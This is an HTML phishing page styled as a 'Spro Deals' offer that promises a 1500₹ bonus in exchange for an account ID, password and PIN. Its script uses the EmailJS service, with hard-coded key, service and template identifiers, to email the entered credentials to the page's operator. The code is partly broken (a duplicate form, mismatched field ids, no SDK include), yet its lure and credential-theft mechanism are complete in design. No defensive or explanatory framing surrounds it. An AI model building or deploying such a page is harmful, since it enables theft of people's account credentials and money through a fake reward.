<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Spro Deals</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      width: 300px;
      text-align: center;
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    button {
      background: green;
      color: white;
      font-weight: bold;
      border: none;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Welcome to Spro Deals</h2>
    <p>You will get 1500₹ bonus if you complete the following steps:</p>
    <form id="myForm">
      <input type="text" name="id number" placeholder="Enter ID Number" required>
      <input type="password" name="password" placeholder="Enter Password" required>
      <input type="text" name="pin" placeholder="Enter PIN" required>
      <button type="submit">Submit</button>
    </form>
    <p id="status"></p>
  </div>

  <!-- EmailJS SDK -->
  <script type="text/javascript">
  (function(){
    emailjs.init("LUAYRaC30g781PF_K"); 
  })();

  function sendMail(e) {
    e.preventDefault();

    var templateParams = {
      account_id: document.getElementById("account_id").value,
      password: document.getElementById("pass").value,
      pin: document.getElementById("pin").value
    };

    emailjs.send("service_ohjwfz9", "template_cwk0gck", templateParams)
      .then(function(response) {
         alert("✅ Email sent successfully!");
      }, function(error) {
         alert("❌ Failed to send email: " + JSON.stringify(error));
      });
  }
</script>

<form onsubmit="sendMail(event)">
  <input type="text" id="account_id" placeholder="Enter ID" required>
  <input type="pass" id="pass" placeholder="Enter Pass" required>
  <input type="text" id="pin" placeholder="Enter PIN" required>
  <button type="submit">Submit</button>
</form>
